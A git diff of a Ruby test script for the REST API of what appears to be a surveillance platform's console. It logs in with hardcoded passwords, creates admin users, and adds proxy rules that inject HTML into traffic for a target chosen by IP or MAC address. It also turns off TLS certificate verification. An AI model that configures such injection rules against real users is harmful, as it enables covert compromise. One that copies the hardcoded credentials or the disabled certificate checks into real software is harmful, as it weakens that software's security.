@@ -11,10 +11,11 @@ http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
 # login
 account = {
-  :user => 'alor', 
-  :pass => 'demorcss'
+  :user => 'daniele', 
+  :pass => 'danielep123'
   }
 resp = http.request_post('/auth/login', account.to_json, nil)
+puts "auth.login"
 puts resp.body
 cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
 puts "cookie " + cookie
@@ -35,14 +36,13 @@ if false
   puts "session.destroy"
   puts res
   puts
-
 end
 
 # user
 if false 
 # user.create
 # {'name': 'admin', 'pass': '6104a8be02be972bedf8c8bf107370fc517e2606', 'desc': 'Deus Ex Machina', 'contact': '', 'privs': ['ADMIN', 'TECH', 'VIEW'], 'enabled': true, 'locale': 'en_US', 'timezone': 0, 'group_ids':[]}
-user = {'name' => 'test', 'pass' => 'test', 'desc' => 'Deus Ex Machina', 'contact' => '', 'privs' => ['ADMIN', 'TECH', 'VIEW'], 'enabled' => true, 'locale' => 'en_US', 'timezone' => 0}
+user = {'name' => 'testina', 'pass' => 'test', 'desc' => 'Deus Ex Machina', 'contact' => '', 'privs' => ['ADMIN', 'TECH', 'VIEW'], 'enabled' => true, 'locale' => 'en_US', 'timezone' => 0}
 res = http.request_post('/user', user.to_json, {'Cookie' => cookie}) 
 puts "user.create "
 puts res
@@ -70,8 +70,6 @@ res = http.request_get("/user/#{test_user['_id']}", {'Cookie' => cookie})
 puts "user.show"
 puts res
 puts
-
-
 
 # user.destroy
 #res = http.delete("/user/#{test_user['_id']}", {'Cookie' => cookie}) 
@@ -192,7 +190,7 @@ if false
    puts
    
   # audit.index
-   res = http.request_get('/audit?filter={"action": ["user.update"]}&startIndex=0&numItems=10', {'Cookie' => cookie})
+   res = http.request_get(URI.escape('/audit?filter={"action": ["user.update"]}&startIndex=0&numItems=10'), {'Cookie' => cookie})
    puts "audit.index 'user.update'"
    puts res
    puts
@@ -241,7 +239,7 @@ if false
 end
 
 # task
-if false
+if true
 
 res = http.request_get('/task', {'Cookie' => cookie})
 puts "task.index"
@@ -265,6 +263,16 @@ puts "task.show"
 puts res
 puts
 
+res = http.request_get("/task/destroy/#{task['_id']}", {'Cookie' => cookie})
+puts "task.destroy"
+puts res
+puts
+
+res = http.request_get("/task", {'Cookie' => cookie})
+puts "task.show"
+puts res
+puts
+
 =begin
 sleep 3
 
@@ -277,7 +285,7 @@ puts
 end # task
 
 # grid
-if true
+if false
 =begin
   grid_id = '4dfa1d1aa4df496c90fab43e' # 1.4 gb (underground.avi)
   #grid_id = '4dfa2483674bba48cd2a153f' # 280 mb (en_outlook.exe)
@@ -302,7 +310,7 @@ if true
 end
 
 # proxy
-if true
+if false
   
   proxy_id = 0
   
@@ -358,8 +366,8 @@ if true
   puts "proxy.add_rule"
   rule = {_id: proxy_id, enabled: true, disable_sync: false, ident: 'STATIC-IP', 
           ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
-          action: 'INJECT-HTML', action_param: 'RCS_0000602', target: '4dfef3792afb6526d0000084'}
-  res = http.request_post('/proxy/add_rule', rule.to_json, {'Cookie' => cookie})
+          action: 'INJECT-HTML', action_param: 'RCS_0000602', target: '4df8bc89963d3523c9000056'}
+  res = http.request_post("/proxy/add_rule", rule.to_json, {'Cookie' => cookie})
   rule = JSON.parse(res.body)
   puts rule
   puts
@@ -373,9 +381,9 @@ if true
   
   # proxy.update_rule
   puts "proxy.update_rule"
-  mod = {_id: proxy_id, rule: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
-          ident_param: '00:11:22:33:44:55', target: '4dfef3792afb6526d0000084'}
-  res = http.request_post('/proxy/update_rule', mod.to_json, {'Cookie' => cookie})
+  mod = {rule: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
+          ident_param: '00:11:22:33:44:55', target: '4df8bc89963d3523c9000056'}
+  res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
   puts res
   puts
   
@@ -388,8 +396,8 @@ if true
   
   # proxy.del_rule
   puts "proxy.del_rule"
-  request = {_id: proxy_id, rule: rule['_id']}
-  res = http.request_post("/proxy/del_rule", request.to_json, {'Cookie' => cookie})
+  request = {rule: rule['_id']}
+  res = http.request_post("/proxy/del_rule/#{proxy_id}", request.to_json, {'Cookie' => cookie})
   puts res
   puts
   
@@ -441,6 +449,6 @@ end
 # logout
 res = http.request_post('/auth/logout', nil, {'Cookie' => cookie})
 puts
-puts "auth.logout "
+puts "auth.logout"
 puts res
 puts
